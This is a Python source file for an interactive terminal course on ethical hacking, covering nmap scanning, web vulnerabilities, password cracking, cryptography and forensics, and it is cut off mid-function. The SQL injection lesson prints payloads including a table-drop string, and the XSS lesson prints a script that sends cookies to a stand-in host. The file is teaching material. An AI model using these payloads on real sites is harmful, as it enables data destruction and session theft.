#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HCO Terminal - A Hacking Teacher by Azhar
Practical Ethical Hacking Learning Platform
"""

import os
import sys
import subprocess
import shutil
import time
import random
import socket
import requests
from urllib.parse import urljoin

class HackingTeacher:
    def __init__(self):
        self.colors = {
            'GREEN': '\033[92m',
            'CYAN': '\033[96m',
            'BLUE': '\033[94m',
            'YELLOW': '\033[93m',
            'RED': '\033[91m',
            'BOLD': '\033[1m',
            'END': '\033[0m'
        }
        self.current_lesson = None
        self.progress = {
            'network_scanning': 0,
            'web_security': 0,
            'cryptography': 0,
            'forensics': 0
        }

    def clear_screen(self):
        os.system('clear')

    def print_header(self):
        self.clear_screen()
        print(f"{self.colors['BLUE']}{self.colors['BOLD']}")
        print("═" * 60)
        print("            HCO TERMINAL - A HACKING TEACHER")
        print("                 Created by Azhar")
        print("═" * 60)
        print(f"{self.colors['END']}")

    def type_effect(self, text, speed=0.03):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(speed)
        print()

    def run_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result
        except Exception as e:
            return None

    def check_tool(self, tool_name):
        return shutil.which(tool_name) is not None

    def main_menu(self):
        while True:
            self.print_header()
            print(f"{self.colors['GREEN']}🎯 What do you want to learn today?{self.colors['END']}\n")
            
            menu_items = [
                "1. Network Scanning & Reconnaissance",
                "2. Web Application Security", 
                "3. Cryptography & Password Cracking",
                "4. Digital Forensics",
                "5. Real Practice Labs",
                "6. Progress Tracking",
                "7. Tool Installation Guide",
                "0. Exit"
            ]
            
            for item in menu_items:
                print(f"  {item}")
            
            print(f"\n{self.colors['YELLOW']}Choose (0-7): {self.colors['END']}", end='')
            choice = input().strip()
            
            if choice == '0':
                self.exit_program()
            elif choice == '1':
                self.network_scanning()
            elif choice == '2':
                self.web_security()
            elif choice == '3':
                self.cryptography()
            elif choice == '4':
                self.digital_forensics()
            elif choice == '5':
                self.practice_labs()
            elif choice == '6':
                self.progress_tracking()
            elif choice == '7':
                self.tool_installation()
            else:
                print(f"{self.colors['RED']}Invalid choice!{self.colors['END']}")
                time.sleep(1)

    def network_scanning(self):
        self.current_lesson = "Network Scanning"
        self.print_header()
        print(f"{self.colors['CYAN']}🌐 NETWORK SCANNING & RECONNAISSANCE{self.colors['END']}\n")
        
        print("In this module, you'll learn:")
        print("• How networks work")
        print("• Port scanning techniques") 
        print("• Service detection")
        print("• Network mapping\n")
        
        print(f"{self.colors['YELLOW']}Choose a lesson:{self.colors['END']}")
        lessons = [
            "1. Basic Network Theory",
            "2. Port Scanning with Nmap", 
            "3. Service Version Detection",
            "4. Network Mapping",
            "5. Practical Exercise",
            "0. Back to Main Menu"
        ]
        
        for lesson in lessons:
            print(f"  {lesson}")
        
        choice = input(f"\n{self.colors['YELLOW']}Choose (0-5): {self.colors['END']}").strip()
        
        if choice == '1':
            self.network_theory()
        elif choice == '2':
            self.port_scanning()
        elif choice == '3':
            self.service_detection()
        elif choice == '4':
            self.network_mapping()
        elif choice == '5':
            self.network_exercise()
        elif choice == '0':
            return

    def network_theory(self):
        self.print_header()
        print(f"{self.colors['CYAN']}📚 BASIC NETWORK THEORY{self.colors['END']}\n")
        
        content = """
🔍 How Networks Work:

• IP Addresses: Unique identifiers for devices (192.168.1.1)
• Ports: Doors to services (SSH:22, HTTP:80, HTTPS:443)
• Protocols: Rules for communication (TCP, UDP, HTTP)

🌐 Common Ports & Services:
22  - SSH (Secure Shell)
80  - HTTP (Web servers)
443 - HTTPS (Secure web)
21  - FTP (File transfer)
25  - SMTP (Email)
53  - DNS (Domain names)
3306 - MySQL Database

📡 TCP vs UDP:
TCP: Reliable, connection-oriented (web browsing, email)
UDP: Fast, connectionless (video streaming, DNS)

🎯 Why Scan Networks?
• Security assessment
• Find vulnerable services
• Network inventory
• Compliance checking

⚠️ Legal Notice: Only scan networks you own or have permission to scan!
"""
        print(content)
        self.press_continue()
        self.progress['network_scanning'] = max(self.progress['network_scanning'], 25)

    def port_scanning(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔍 PORT SCANNING WITH NMAP{self.colors['END']}\n")
        
        if not self.check_tool('nmap'):
            print(f"{self.colors['RED']}Nmap is not installed!{self.colors['END']}")
            print("Install it with: pkg install nmap")
            self.press_continue()
            return
        
        print("Let's learn practical Nmap commands:\n")
        
        commands = {
            "Basic TCP Scan": "nmap 192.168.1.1",
            "Scan specific ports": "nmap -p 80,443,22 192.168.1.1", 
            "Scan port range": "nmap -p 1-1000 192.168.1.1",
            "Fast scan": "nmap -F 192.168.1.1",
            "Service detection": "nmap -sV 192.168.1.1",
            "OS detection": "nmap -O 192.168.1.1"
        }
        
        for desc, cmd in commands.items():
            print(f"{self.colors['GREEN']}• {desc}:{self.colors['END']}")
            print(f"  {self.colors['YELLOW']}{cmd}{self.colors['END']}\n")
        
        print(f"{self.colors['BLUE']}💡 Try these commands on your local network:{self.colors['END']}")
        print("  nmap 127.0.0.1 (scan your own machine)")
        print("  nmap 192.168.1.0/24 (scan your local network)")
        
        self.press_continue()
        self.progress['network_scanning'] = max(self.progress['network_scanning'], 50)

    def service_detection(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔍 SERVICE VERSION DETECTION{self.colors['END']}\n")
        
        print("Service detection helps identify:")
        print("• What software is running")
        print("• Version numbers") 
        print("• Potential vulnerabilities\n")
        
        print(f"{self.colors['GREEN']}Nmap Service Detection:{self.colors['END']}")
        print("nmap -sV 192.168.1.1")
        print("nmap -sV --version-intensity 5 192.168.1.1")
        print("nmap -sV -p 80,443,22 192.168.1.1\n")
        
        print(f"{self.colors['BLUE']}Example Output:{self.colors['END']}")
        print("""PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.41
22/tcp  open  ssh     OpenSSH 8.2p1
443/tcp open  ssl/http Apache httpd 2.4.41""")
        
        print(f"\n{self.colors['YELLOW']}Why this matters:{self.colors['END']}")
        print("• Old versions may have known vulnerabilities")
        print("• Helps plan security updates")
        print("• Identifies unnecessary services")
        
        self.press_continue()
        self.progress['network_scanning'] = max(self.progress['network_scanning'], 75)

    def network_mapping(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🗺 NETWORK MAPPING{self.colors['END']}\n")
        
        print("Network mapping creates a 'map' of all devices on a network:\n")
        
        print(f"{self.colors['GREEN']}Nmap Network Discovery:{self.colors['END']}")
        print("nmap -sn 192.168.1.0/24          # Ping scan")
        print("nmap -sS 192.168.1.0/24          # TCP SYN scan") 
        print("nmap -A 192.168.1.1              # Aggressive scan")
        print("nmap --script discovery 192.168.1.1  # Script scanning\n")
        
        print(f"{self.colors['BLUE']}Real Example - Scan your network:{self.colors['END']}")
        print("1. Find your network: ip route show")
        print("2. Scan it: nmap -sn 192.168.1.0/24")
        print("3. See all active devices\n")
        
        print(f"{self.colors['YELLOW']}What you'll discover:{self.colors['END']}")
        print("• All computers on the network")
        print("• Phones, tablets, IoT devices") 
        print("• Routers and network equipment")
        print("• Open ports on each device")
        
        self.press_continue()

    def network_exercise(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🏆 NETWORK SCANNING EXERCISE{self.colors['END']}\n")
        
        print("Let's practice what you've learned!\n")
        
        exercises = [
            "1. Scan your own computer (127.0.0.1)",
            "2. Find your IP address and scan it", 
            "3. Discover devices on your local network",
            "4. Scan a specific website (like google.com)",
            "5. Practice all scan types on localhost"
        ]
        
        for ex in exercises:
            print(f"  {ex}")
        
        print(f"\n{self.colors['GREEN']}Step-by-Step Guide:{self.colors['END']}")
        print("1. Open a new terminal window")
        print("2. Try each exercise with nmap commands")
        print("3. Note down what you discover")
        print("4. Research any unfamiliar services\n")
        
        print(f"{self.colors['YELLOW']}Example Commands to Try:{self.colors['END']}")
        print("nmap 127.0.0.1")
        print("nmap -sV localhost") 
        print("nmap -A 127.0.0.1")
        print("nmap google.com")
        
        self.press_continue()
        self.progress['network_scanning'] = 100

    def web_security(self):
        self.current_lesson = "Web Security"
        self.print_header()
        print(f"{self.colors['CYAN']}🌐 WEB APPLICATION SECURITY{self.colors['END']}\n")
        
        print("Learn how to test and secure web applications:\n")
        
        lessons = [
            "1. Understanding Web Architecture",
            "2. Common Web Vulnerabilities", 
            "3. SQL Injection Attacks",
            "4. Cross-Site Scripting (XSS)",
            "5. Practical Web Testing",
            "0. Back to Main Menu"
        ]
        
        for lesson in lessons:
            print(f"  {lesson}")
        
        choice = input(f"\n{self.colors['YELLOW']}Choose (0-5): {self.colors['END']}").strip()
        
        if choice == '1':
            self.web_architecture()
        elif choice == '2':
            self.web_vulnerabilities()
        elif choice == '3':
            self.sql_injection()
        elif choice == '4':
            self.xss_attacks()
        elif choice == '5':
            self.web_practice()
        elif choice == '0':
            return

    def web_architecture(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🏗 WEB APPLICATION ARCHITECTURE{self.colors['END']}\n")
        
        content = """
🌐 How Web Applications Work:

Client (Browser) ←→ Web Server ←→ Database

🔧 Components:
• Frontend: HTML, CSS, JavaScript (what users see)
• Backend: PHP, Python, Node.js (server logic)  
• Database: MySQL, PostgreSQL (data storage)
• Web Server: Apache, Nginx (serves content)

📡 HTTP Protocol:
GET  - Request data (viewing pages)
POST - Send data (login forms, searches)
PUT  - Update data
DELETE - Remove data

🔍 Important Headers:
• Cookies: Session management
• User-Agent: Browser identification  
• Referer: Where you came from
• Content-Type: Data format

🎯 Attack Surface:
• Input forms (search, login, contact)
• URL parameters (?id=1, ?user=admin)
• File uploads
• Authentication systems
"""
        print(content)
        self.press_continue()
        self.progress['web_security'] = max(self.progress['web_security'], 20)

    def web_vulnerabilities(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🛡 COMMON WEB VULNERABILITIES{self.colors['END']}\n")
        
        vulnerabilities = {
            "SQL Injection": "Attackers inject database commands through input fields",
            "XSS (Cross-Site Scripting)": "Inject malicious JavaScript into web pages", 
            "CSRF (Cross-Site Request Forgery)": "Trick users into performing actions",
            "File Upload Vulnerabilities": "Upload malicious files to the server",
            "Authentication Bypass": "Access features without proper login",
            "Information Disclosure": "Reveal sensitive data accidentally"
        }
        
        for vuln, desc in vulnerabilities.items():
            print(f"{self.colors['RED']}• {vuln}:{self.colors['END']}")
            print(f"  {desc}\n")
        
        print(f"{self.colors['GREEN']}Testing Tools:{self.colors['END']}")
        print("• Browser Developer Tools (F12)")
        print("• Burp Suite - Professional web testing")
        print("• OWASP ZAP - Free security scanner")
        print("• SQLMap - Automated SQL injection")
        
        self.press_continue()
        self.progress['web_security'] = max(self.progress['web_security'], 40)

    def sql_injection(self):
        self.print_header()
        print(f"{self.colors['CYAN']}💉 SQL INJECTION ATTACKS{self.colors['END']}\n")
        
        print("SQL Injection occurs when user input is not properly sanitized.\n")
        
        print(f"{self.colors['GREEN']}Example Vulnerable Code:{self.colors['END']}")
        print('query = "SELECT * FROM users WHERE username = \'' + username + '\' AND password = \'' + password + '\'"')
        
        print(f"\n{self.colors['RED']}Attack Input:{self.colors['END']}")
        print("Username: admin' --")
        print("Password: anything")
        
        print(f"\n{self.colors['YELLOW']}Resulting Query:{self.colors['END']}")
        print("SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'")
        print("The -- comments out the rest of the query!\n")
        
        print(f"{self.colors['BLUE']}Common SQL Injection Payloads:{self.colors['END']}")
        print("' OR '1'='1")
        print("' UNION SELECT 1,2,3--")
        print("'; DROP TABLE users--")
        
        print(f"\n{self.colors['GREEN']}Prevention:{self.colors['END']}")
        print("• Use parameterized queries")
        print("• Input validation")
        print("• Web Application Firewalls")
        
        self.press_continue()
        self.progress['web_security'] = max(self.progress['web_security'], 60)

    def xss_attacks(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🎯 CROSS-SITE SCRIPTING (XSS){self.colors['END']}\n")
        
        print("XSS allows attackers to inject malicious scripts into web pages.\n")
        
        print(f"{self.colors['GREEN']}Types of XSS:{self.colors['END']}")
        print("• Reflected XSS - Script reflected from input")
        print("• Stored XSS - Script stored on server") 
        print("• DOM-based XSS - Client-side manipulation\n")
        
        print(f"{self.colors['RED']}Example Attack:{self.colors['END']}")
        print("Search box input: <script>alert('XSS')</script>")
        print("If unsanitized, this executes in browsers!\n")
        
        print(f"{self.colors['YELLOW']}Real XSS Payloads:{self.colors['END']}")
        print('<script>document.location="http://hacker.com/steal?c="+document.cookie</script>')
        print('<img src=x onerror=alert(1)>')
        print('<svg onload=alert(1)>')
        
        print(f"\n{self.colors['GREEN']}Prevention:{self.colors['END']}")
        print("• Input sanitization")
        print("• Content Security Policy (CSP)")
        print("• Output encoding")
        
        self.press_continue()
        self.progress['web_security'] = max(self.progress['web_security'], 80)

    def web_practice(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🏆 WEB SECURITY PRACTICE{self.colors['END']}\n")
        
        print("Practice on these safe, legal environments:\n")
        
        practice_sites = {
            "OWASP Juice Shop": "Modern vulnerable web app",
            "bWAPP": "Classic web vulnerabilities", 
            "DVWA (Damn Vulnerable Web App)": "Beginner-friendly",
            "WebGoat": "Learning platform from OWASP",
            "HackTheBox Web Challenges": "Realistic scenarios"
        }
        
        for site, desc in practice_sites.items():
            print(f"{self.colors['GREEN']}• {site}:{self.colors['END']}")
            print(f"  {desc}")
        
        print(f"\n{self.colors['BLUE']}Setup OWASP Juice Shop (Recommended):{self.colors['END']}")
        print("docker pull bkimminich/juice-shop")
        print("docker run -d -p 3000:3000 bkimminich/juice-shop")
        print("Then visit: http://localhost:3000")
        
        print(f"\n{self.colors['YELLOW']}Practice Exercises:{self.colors['END']}")
        print("1. Find and exploit SQL injection")
        print("2. Discover XSS vulnerabilities") 
        print("3. Bypass authentication")
        print("4. Access admin functionality")
        
        self.press_continue()
        self.progress['web_security'] = 100

    def cryptography(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔐 CRYPTOGRAPHY & PASSWORD CRACKING{self.colors['END']}\n")
        
        print("Learn about encryption and password security:\n")
        
        lessons = [
            "1. Cryptography Basics", 
            "2. Hash Functions",
            "3. Password Cracking Techniques",
            "4. Encryption Algorithms",
            "5. Practical Exercises",
            "0. Back to Main Menu"
        ]
        
        for lesson in lessons:
            print(f"  {lesson}")
        
        choice = input(f"\n{self.colors['YELLOW']}Choose (0-5): {self.colors['END']}").strip()
        
        if choice == '1':
            self.crypto_basics()
        elif choice == '2':
            self.hash_functions()
        elif choice == '3':
            self.password_cracking()
        elif choice == '4':
            self.encryption_algorithms()
        elif choice == '5':
            self.crypto_practice()
        elif choice == '0':
            return

    def crypto_basics(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔐 CRYPTOGRAPHY BASICS{self.colors['END']}\n")
        
        content = """
🔒 What is Cryptography?
The practice of secure communication in the presence of adversaries.

🎯 Key Concepts:
• Encryption: Convert plaintext to ciphertext
• Decryption: Convert ciphertext back to plaintext  
• Key: Secret used for encryption/decryption
• Algorithm: Mathematical process for encryption

🔑 Types of Cryptography:

1. Symmetric Encryption:
   - Same key for encryption and decryption
   - Examples: AES, DES, 3DES
   - Fast but key distribution is challenging

2. Asymmetric Encryption:
   - Public key (encrypt) and private key (decrypt)
   - Examples: RSA, ECC, Diffie-Hellman
   - Secure key exchange but slower

3. Hash Functions:
   - One-way mathematical functions
   - Examples: MD5, SHA-1, SHA-256
   - Used for password storage, data integrity
"""
        print(content)
        self.press_continue()
        self.progress['cryptography'] = max(self.progress['cryptography'], 20)

    def hash_functions(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔗 HASH FUNCTIONS{self.colors['END']}\n")
        
        print("Hash functions create unique fingerprints of data:\n")
        
        hashes = {
            "MD5": "128-bit hash (insecure)",
            "SHA-1": "160-bit hash (weak)", 
            "SHA-256": "256-bit hash (secure)",
            "bcrypt": "Password hashing (very secure)",
            "NTLM": "Windows password hash"
        }
        
        for hash_name, desc in hashes.items():
            print(f"{self.colors['GREEN']}• {hash_name}:{self.colors['END']}")
            print(f"  {desc}")
        
        print(f"\n{self.colors['BLUE']}Hash Examples:{self.colors['END']}")
        print("'hello' → MD5: 5d41402abc4b2a76b9719d911017c592")
        print("'password' → MD5: 5f4dcc3b5aa765d61d8327deb882cf99")
        
        print(f"\n{self.colors['YELLOW']}Creating Hashes in Terminal:{self.colors['END']}")
        print("echo -n 'hello' | md5sum")
        print("echo -n 'hello' | sha1sum") 
        print("echo -n 'hello' | sha256sum")
        
        self.press_continue()
        self.progress['cryptography'] = max(self.progress['cryptography'], 40)

    def password_cracking(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔓 PASSWORD CRACKING TECHNIQUES{self.colors['END']}\n")
        
        print("Learn how passwords are cracked (for educational purposes):\n")
        
        techniques = {
            "Dictionary Attack": "Try common passwords from wordlists",
            "Brute Force": "Try all possible combinations", 
            "Rainbow Tables": "Precomputed hash tables",
            "Hybrid Attack": "Combine dictionary and brute force",
            "Social Engineering": "Guess based on personal info"
        }
        
        for technique, desc in techniques.items():
            print(f"{self.colors['RED']}• {technique}:{self.colors['END']}")
            print(f"  {desc}")
        
        print(f"\n{self.colors['GREEN']}Password Cracking Tools:{self.colors['END']}")
        print("• John the Ripper - Fast password cracker")
        print("• Hashcat - GPU-accelerated cracking")
        print("• Hydra - Network login cracker")
        
        print(f"\n{self.colors['BLUE']}Example with John the Ripper:{self.colors['END']}")
        print("1. Save hashes to file: echo '5f4dcc3b5aa765d61d8327deb882cf99' > hashes.txt")
        print("2. Crack: john --format=raw-md5 hashes.txt")
        print("3. Show results: john --show hashes.txt")
        
        print(f"\n{self.colors['YELLOW']}⚠️ Legal Use Only:{self.colors['END']}")
        print("Only crack passwords you own or have explicit permission for!")
        
        self.press_continue()
        self.progress['cryptography'] = max(self.progress['cryptography'], 60)

    def encryption_algorithms(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🔏 ENCRYPTION ALGORITHMS{self.colors['END']}\n")
        
        algorithms = {
            "AES (Advanced Encryption Standard)": "Most common symmetric encryption",
            "RSA": "Most common asymmetric encryption", 
            "DES/3DES": "Older symmetric algorithms (insecure)",
            "Blowfish": "Fast symmetric algorithm",
            "ECC (Elliptic Curve Cryptography)": "Modern asymmetric encryption"
        }
        
        for algo, desc in algorithms.items():
            print(f"{self.colors['GREEN']}• {algo}:{self.colors['END']}")
            print(f"  {desc}")
        
        print(f"\n{self.colors['BLUE']}Practical OpenSSL Examples:{self.colors['END']}")
        print("# Encrypt a file with AES")
        print("openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc")
        
        print("\n# Decrypt the file")
        print("openssl enc -aes-256-cbc -d -in secret.enc -out secret.txt")
        
        print("\n# Generate RSA key pair")
        print("openssl genrsa -out private.key 2048")
        print("openssl rsa -in private.key -pubout -out public.key")
        
        self.press_continue()
        self.progress['cryptography'] = max(self.progress['cryptography'], 80)

    def crypto_practice(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🏆 CRYPTOGRAPHY PRACTICE{self.colors['END']}\n")
        
        print("Hands-on exercises to practice cryptography:\n")
        
        print(f"{self.colors['GREEN']}Exercise 1: Hash Analysis{self.colors['END']}")
        print("1. Create MD5 hashes of common passwords")
        print("2. Use online hash databases to crack them")
        print("3. Understand why strong passwords matter\n")
        
        print(f"{self.colors['GREEN']}Exercise 2: File Encryption{self.colors['END']}")
        print("1. Create a text file with sensitive data")
        print("2. Encrypt it using OpenSSL AES")
        print("3. Decrypt it back to verify\n")
        
        print(f"{self.colors['GREEN']}Exercise 3: Password Security{self.colors['END']}")
        print("1. Generate a strong password (12+ characters)")
        print("2. Check its hash strength")
        print("3. Understand password policies\n")
        
        print(f"{self.colors['YELLOW']}Commands to Practice:{self.colors['END']}")
        print("echo -n 'mypassword' | md5sum")
        print("openssl enc -aes-256-cbc -salt -in file.txt -out file.enc")
        print("john --format=raw-md5 hashes.txt")
        
        self.press_continue()
        self.progress['cryptography'] = 100

    def digital_forensics(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🕵️ DIGITAL FORENSICS{self.colors['END']}\n")
        
        print("Learn how to investigate digital evidence:\n")
        
        lessons = [
            "1. Forensics Fundamentals", 
            "2. File System Analysis",
            "3. Memory Forensics",
            "4. Network Forensics", 
            "5. Incident Response",
            "0. Back to Main Menu"
        ]
        
        for lesson in lessons:
            print(f"  {lesson}")
        
        choice = input(f"\n{self.colors['YELLOW']}Choose (0-5): {self.colors['END']}").strip()
        
        if choice == '1':
            self.forensics_basics()
        elif choice == '2':
            self.file_system_analysis()
        elif choice == '3':
            self.memory_forensics()
        elif choice == '4':
            self.network_forensics()
        elif choice == '5':
            self.incident_response()
        elif choice == '0':
            return

    def forensics_basics(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🕵️ DIGITAL FORENSICS BASICS{self.colors['END']}\n")
        
        content = """
🔍 What is Digital Forensics?
The process of uncovering and interpreting electronic data.

🎯 Goals:
• Preserve evidence integrity
• Identify what happened
• Recover deleted information  
• Support legal proceedings

📋 Forensic Process:
1. Identification - Find potential evidence
2. Preservation - Secure and document
3. Analysis - Examine the evidence
4. Documentation - Record findings
5. Presentation - Report results

🛠 Common Tools:
• Autopsy - Graphical forensic browser
• Sleuth Kit - Command-line tools
• Wireshark - Network analysis
• Volatility - Memory analysis
• FTK Imager - Disk imaging

⚠️ Legal Considerations:
• Always have proper authorization
• Maintain chain of custody
• Follow legal procedures
"""
        print(content)
        self.press_continue()
        self.progress['forensics'] = max(self.progress['forensics'], 20)

    def file_system_analysis(self):
        self.print_header()
        print(f"{self.colors['CYAN']}📁 FILE SYSTEM ANALYSIS{self.colors['END']}\n")
        
        print("Analyze file systems for evidence:\n")
        
        print(f"{self.colors['GREEN']}Key Areas to Examine:{self.colors['END']}")
        print("• Deleted files recovery")
        print("• File metadata (timestamps)")
        print("• Hidden and system files") 
        print("• Log files")
        print("• Browser history")
        print("• Registry (Windows) or plists (macOS)\n")
        
        print(f"{self.colors['BLUE']}Useful Commands:{self.colors['END']}")
        print("strings file.bin                    # Extract text from binary")
        print("file unknown.file                   # Identify file type")
        print("hexdump -C file.bin | head -20      # View hex dump")
        print("stat file.txt                       # File metadata")
        print("find / -name \"*.log\" 2>/dev/null   # Find log files")
        
        print(f"\n{self.colors['YELLOW']}Recovering Deleted Files:{self.colors['END']}")
        print("• Check trash/recycle bin")
        print("• Use tools like photorec, testdisk")
        print("• Analyze free space for file remnants")
        
        self.press_continue()
        self.progress['forensics'] = max(self.progress['forensics'], 40)

    def memory_forensics(self):
        self.print_header()
        print(f"{self.colors['CYAN']}💾 MEMORY FORENSICS{self.colors['END']}\n")
        
        print("Analyze RAM for volatile evidence:\n")
        
        print(f"{self.colors['GREEN']}What Memory Contains:{self.colors['END']}")
        print("• Running processes")
        print("• Open network connections") 
        print("• Loaded drivers and modules")
        print("• Encryption keys and passwords")
        print("• Malware and rootkits\n")
        
        print(f"{self.colors['BLUE']}Volatility Framework:{self.colors['END']}")
        print("The premier memory analysis tool:\n")
        
        print("volatility -f memory.dump imageinfo              # Identify OS")
        print("volatility -f memory.dump --profile=Win7SP1 pslist  # Process list")
        print("volatility -f memory.dump --profile=Win7SP1 netscan # Network connections")
        print("volatility -f memory.dump --profile=Win7SP1 malfind  # Find malware")
        
        print(f"\n{self.colors['YELLOW']}Creating Memory Dumps:{self.colors['END']}")
        print("• Use tools like DumpIt, WinPmem")
        print("• Capture before system shutdown")
        print("• Preserve evidence integrity")
        
        self.press_continue()
        self.progress['forensics'] = max(self.progress['forensics'], 60)

    def network_forensics(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🌐 NETWORK FORENSICS{self.colors['END']}\n")
        
        print("Analyze network traffic for security incidents:\n")
        
        print(f"{self.colors['GREEN']}What to Look For:{self.colors['END']}")
        print("• Suspicious connections")
        print("• Data exfiltration attempts")
        print("• Malware communications") 
        print("• Unauthorized access")
        print("• Policy violations\n")
        
        print(f"{self.colors['BLUE']}Wireshark for Network Analysis:{self.colors['END']}")
        print("wireshark packet_capture.pcap                   # GUI analysis")
        print("tshark -r packet_capture.pcap -Y 'http'         # CLI filtering")
        print("tcpdump -i eth0 -w capture.pcap                 # Capture packets")
        
        print(f"\n{self.colors['YELLOW']}Useful Wireshark Filters:{self.colors['END']}")
        print("http.request.method == \"POST\"                  # HTTP POST requests")
        print("dns                                             # DNS queries")
        print("tcp.port == 443                                # HTTPS traffic") 
        print("ip.addr == 192.168.1.100                       # Specific IP")
        
        self.press_continue()
        self.progress['forensics'] = max(self.progress['forensics'], 80)

    def incident_response(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🚨 INCIDENT RESPONSE{self.colors['END']}\n")
        
        print("Respond to security incidents effectively:\n")
        
        print(f"{self.colors['GREEN']}Incident Response Steps:{self.colors['END']}")
        print("1. Preparation - Have tools and procedures ready")
        print("2. Identification - Detect and verify incidents") 
        print("3. Containment - Limit the damage")
        print("4. Eradication - Remove the threat")
        print("5. Recovery - Restore normal operations")
        print("6. Lessons Learned - Improve for future\n")
        
        print(f"{self.colors['BLUE']}Immediate Actions:{self.colors['END']}")
        print("• Isolate affected systems from network")
        print("• Preserve evidence for analysis")
        print("• Document everything with timestamps")
        print("• Notify appropriate personnel")
        
        print(f"\n{self.colors['YELLOW']}Common Incident Types:{self.colors['END']}")
        print("• Malware infection")
        print("• Unauthorized access") 
        print("• Data breach")
        print("• Denial of Service (DoS)")
        print("• Insider threats")
        
        self.press_continue()
        self.progress['forensics'] = 100

    def practice_labs(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🧪 REAL PRACTICE LABS{self.colors['END']}\n")
        
        print("Set up safe environments to practice hacking:\n")
        
        labs = [
            "1. OWASP Juice Shop Setup",
            "2. Metasploitable VM", 
            "3. TryHackMe Guide",
            "4. Hack The Box Guide",
            "5. Custom Lab Creation",
            "0. Back to Main Menu"
        ]
        
        for lab in labs:
            print(f"  {lab}")
        
        choice = input(f"\n{self.colors['YELLOW']}Choose (0-5): {self.colors['END']}").strip()
        
        if choice == '1':
            self.juice_shop_lab()
        elif choice == '2':
            self.metasploitable_lab()
        elif choice == '3':
            self.tryhackme_guide()
        elif choice == '4':
            self.hackthebox_guide()
        elif choice == '5':
            self.custom_labs()
        elif choice == '0':
            return

    def juice_shop_lab(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🛡️ OWASP JUICE SHOP SETUP{self.colors['END']}\n")
        
        print("Modern vulnerable web app for learning:\n")
        
        print(f"{self.colors['GREEN']}Using Docker (Recommended):{self.colors['END']}")
        print("docker pull bkimminich/juice-shop")
        print("docker run -d -p 3000:3000 bkimminich/juice-shop")
        print("Access: http://localhost:3000\n")
        
        print(f"{self.colors['BLUE']}Using Node.js:{self.colors['END']}")
        print("git clone https://github.com/juice-shop/juice-shop.git")
        print("cd juice-shop")
        print("npm install")
        print("npm start")
        print("Access: http://localhost:3000\n")
        
        print(f"{self.colors['YELLOW']}Learning Challenges:{self.colors['END']}")
        print("• SQL Injection in login forms")
        print("• XSS in product reviews") 
        print("• Authentication bypass")
        print("• API security issues")
        print("• Privacy violations")
        
        print(f"\n{self.colors['GREEN']}Getting Started:{self.colors['END']}")
        print("1. Set up Juice Shop")
        print("2. Try to find 5 different vulnerabilities")
        print("3. Document your findings")
        print("4. Research how to prevent each issue")
        
        self.press_continue()

    def metasploitable_lab(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🎯 METASPLOITABLE VM SETUP{self.colors['END']}\n")
        
        print("Intentionally vulnerable Linux VM:\n")
        
        print(f"{self.colors['GREEN']}Download:{self.colors['END']}")
        print("https://sourceforge.net/projects/metasploitable/")
        print("File: Metasploitable2-Linux.zip\n")
        
        print(f"{self.colors['BLUE']}Setup in VirtualBox:{self.colors['END']}")
        print("1. Extract the ZIP file")
        print("2. Open VirtualBox")
        print("3. Add existing VM: Metasploitable.vbox")
        print("4. Start the VM\n")
        
        print(f"{self.colors['YELLOW']}Default Credentials:{self.colors['END']}")
        print("Username: msfadmin")
        print("Password: msfadmin\n")
        
        print(f"{self.colors['RED']}⚠️ IMPORTANT WARNINGS:{self.colors['END']}")
        print("• Use isolated network (host-only or NAT network)")
        print("• Never expose to the internet")
        print("• Use only for educational purposes")
        print("• Contains real vulnerabilities!\n")
        
        print(f"{self.colors['GREEN']}Practice Exercises:{self.colors['END']}")
        print("• Port scanning with nmap")
        print("• Exploit known vulnerabilities") 
        print("• Privilege escalation")
        print("• Post-exploitation activities")
        
        self.press_continue()

    def tryhackme_guide(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🚀 TRYHACKME LEARNING GUIDE{self.colors['END']}\n")
        
        print("Beginner-friendly hacking platform:\n")
        
        print(f"{self.colors['GREEN']}Getting Started:{self.colors['END']}")
        print("1. Sign up: https://tryhackme.com")
        print("2. Complete 'Pre Security' learning path")
        print("3. Move to 'Complete Beginner' path")
        print("4. Use the built-in attack box or OpenVPN\n")
        
        print(f"{self.colors['BLUE']}Recommended Learning Path:{self.colors['END']}")
        print("1. Pre Security - Fundamentals")
        print("2. Complete Beginner - Basic hacking")
        print("3. Web Fundamentals - Web security") 
        print("4. Jr Penetration Tester - Career skills")
        print("5. Offensive Pentesting - Advanced topics\n")
        
        print(f"{self.colors['YELLOW']}Free Rooms to Start:{self.colors['END']}")
        print("• Intro to Offensive Security")
        print("• Linux Fundamentals") 
        print("• Network Fundamentals")
        print("• Web Application Security")
        print("• Metasploit Introduction")
        
        print(f"\n{self.colors['GREEN']}Tips:{self.colors['END']}")
        print("• Take notes for each room")
        print("• Join the THM community")
        print("• Practice regularly")
        print("• Don't rush - understand concepts")
        
        self.press_continue()

    def hackthebox_guide(self):
        self.print_header()
        print(f"{self.colors['CYAN']}🏆 HACK THE BOX GUIDE{self.colors['END']}\n")
        
        print("Advanced hacking platform with real machines:\n")
        
